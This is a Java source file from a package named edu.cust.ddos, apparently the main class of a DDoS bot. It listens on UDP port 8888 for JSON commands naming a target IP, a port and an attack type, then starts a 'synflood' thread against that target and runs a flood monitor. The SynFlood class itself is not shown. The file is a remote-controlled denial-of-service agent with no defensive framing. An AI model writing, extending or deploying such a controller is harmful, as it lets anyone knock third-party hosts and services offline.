package edu.cust.ddos;

import java.io.IOException;
import java.net.DatagramPacket;
import java.net.DatagramSocket;
import java.net.InetAddress;
import java.nio.charset.StandardCharsets;
import java.util.HashMap;
import java.util.Map;

import com.google.gson.Gson;

public class Main {

	public static void main(String[] args) {
		
		HashMap<String, Class<?>> commands = new HashMap<>();
		commands.put("synflood", SynFlood.class);
		
		// TODO Auto-generated method stub
		try (DatagramSocket ds = new DatagramSocket(8888)) {
			SynFloodMonitor sfm = new SynFloodMonitor();
			new Thread(sfm).start();
			for (;;) { // 无限循环
				// 数据缓冲区:
				byte[] buffer = new byte[4096];
				DatagramPacket packet = new DatagramPacket(buffer, buffer.length);
				try {
					ds.receive(packet); // 收取一个UDP数据包
					InetAddress addr = packet.getAddress();
					int port = 8080;
					// 收取到的数据存储在buffer中，由packet.getOffset(), packet.getLength()指定起始位置和长度
					// 将其按UTF-8编码转换为String:
					String data = new String(packet.getData(), packet.getOffset(), packet.getLength(), StandardCharsets.UTF_8);
					Map<?,?> obj = new Gson().fromJson(data, Map.class);
					String targetIp = (String) obj.get("targetIp");
					int targetPort = ((Double) obj.get("targetPort")).intValue();
					sfm.putChm(targetIp, targetPort);
					
					String command = (String)obj.get("command");
					Class<?> clazz = commands.get(command);
					if(clazz != null) {
						try {
							Thread t = (Thread)clazz.getConstructor(InetAddress.class, Integer.TYPE, Map.class)
							.newInstance(addr, port, obj);
							t.start();
						}catch(Exception ex) {
							ex.printStackTrace();
						}
					}
				}catch(IOException ex) {
					ex.printStackTrace();
				}
			}
		}catch(IOException ex) {
			ex.printStackTrace();
		}
		
	}

}
